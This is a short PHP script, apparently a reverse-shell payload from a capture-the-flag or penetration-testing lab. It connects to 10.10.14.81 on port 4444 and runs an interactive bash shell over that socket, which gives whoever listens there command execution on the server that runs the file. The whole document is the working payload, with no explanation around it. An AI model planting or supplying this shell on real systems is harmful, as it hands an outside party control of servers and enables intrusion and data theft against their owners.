<?php
$ip = '10.10.14.81';
$port = 4444;
$sock = fsockopen($ip, $port);
shell_exec("/bin/bash -i <&3 >&3 2>&3");
?>

